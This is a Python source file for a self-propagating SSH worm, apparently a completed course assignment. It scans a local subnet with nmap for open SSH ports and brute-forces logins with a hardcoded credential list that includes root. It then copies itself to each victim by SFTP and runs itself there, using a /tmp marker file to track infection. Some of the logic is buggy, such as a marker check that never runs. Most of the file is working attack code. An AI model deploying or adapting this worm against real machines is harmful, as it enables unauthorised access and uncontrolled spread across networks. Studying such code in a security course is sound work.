import paramiko
import sys
import socket
import netifaces
import nmap
import netinfo
import os
import sys

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	#pass
	return os.path.isfile("/tmp/infected.txt")

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	#pass
	os.mknod(INFECTED_MARKER_FILE)	

#################s##############################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	#pass
	sftpClient = sshClient.open_sftp()
	sftpClient.put("worm.py","/tmp/worm.py")
	stdin, stdout, stderr = sshClient.exec_command("chmod a+x /tmp/worm.py")
	print stderr.readlines()
	stdin, stdou, stderr = sshClient.exec_command("python /tmp/worm.py")
	print stderr.readlines()


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - tihe host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     # Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	#pass
	try:
		sshClient.connect(host, username = userName, password = password)
		return 0
	except paramiko.SSHException:
		return 1
	except (socket.error, socket.gaierror) as e:
		return 3

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
	
	# Go through the credentials
	for (username, password) in credList:
		
		result = tryCredentials(host, username, password, ssh)
		
		if result != 1:
			attemptResults = (ssh, username, password, host)
			break
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		#pass	
			
	# Could not find working credentials
	return attemptResults 

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	ipAddr = None

	for netFaces in interface:
		addr = netifaces.ifaddresses(netFaces)[2][0]['addr']

		if not addr == "127.0.0.1":
			ipAddr = addr
			break

	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.
	portScanner = nmap.PortScanner()

	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

	hostInfo = portScanner.all_hosts()

	liveHosts = []

	for host in hostInfo:
		if portScanner[host].state() == "up":
			liveHosts.append(host)	
	return liveHosts
	#pass

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:	
	if isInfectedSystem == "True":
		print "Infected"
		exit(0)
	else:
		print "Infect"
		markInfected()
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	#pass
# TODO: Get the IP of the current system
networkInterfaces = netifaces.interfaces()

myIP = getMyIP(networkInterfaces)

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
networkHosts.remove(myIP)

print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	print "ssh info"
	print sshInfo
	

	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		try:
			remotepath = '/tmp/infected.txt'
			localpath = '/home/cpsc/infected.txt'
			sftpClient = sshInfo[0].open_sftp()
			sftpClient.get(remotepath, localpath)
			print "It didn't work"
		except IOError:
			print "This system should be infected"
		# TODO: Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		# try:
        	#	 remotepath = '/tmp/infected.txt'
		#        localpath = '/home/cpsc/'
		#	 # Copy the file from the specified
		#	 # remote path to the specified
		# 	 # local path. If the file does exist
		#	 # at the remote path, then get()
		# 	 # will throw IOError exception
		# 	 # (that is, we know the system is
		# 	 # not yet infected).
		# 
		#        sftp.get(filepath, localpath)
		# except IOError:
		#       print "This system should be infected"
		#
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
			spreadAndExecute(sshInfo[0])
			exit(0)
		print "Spreading complete"
		#exit(0)	
	

